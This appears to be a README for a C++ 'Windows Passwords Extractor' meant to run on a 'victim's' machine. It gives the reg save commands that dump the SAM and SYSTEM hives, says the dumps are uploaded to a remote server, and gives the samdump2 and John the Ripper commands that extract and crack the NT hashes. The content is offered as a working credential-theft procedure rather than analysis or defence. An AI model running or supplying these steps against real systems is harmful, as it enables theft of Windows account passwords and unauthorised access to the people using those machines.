# Windows Passwords Extractor

A small utility that can be written in any language, had to implement it in C++ so i won't need any frameworks installed on the victim's OS (such as python / ruby / .net / ... )

**Dumps protected password files & upload to a remote server for brute force analysis.**

I've seen many utilities that install drivers and some require livecd mount etc.. 
It can be simple. the `reg` command has `save` param, that can be used to dump the hashed passwords information.


```
reg save hklm\sam sam.dump /y
reg save hklm\system system.dump /y
```
 - run as privileged user


### Analysis
use a linux machine, get the uploaded files from your server.

Decrypt `system.dump`, `sam.dump` using `samdump2`
```
samdump2 -o out system.dump sam.dump > hashed-passwords.txt
```

Brbute force `hashed-passwords.txt` using `john the ripper`
```
john --format=NT hashed-passwords.txt
```

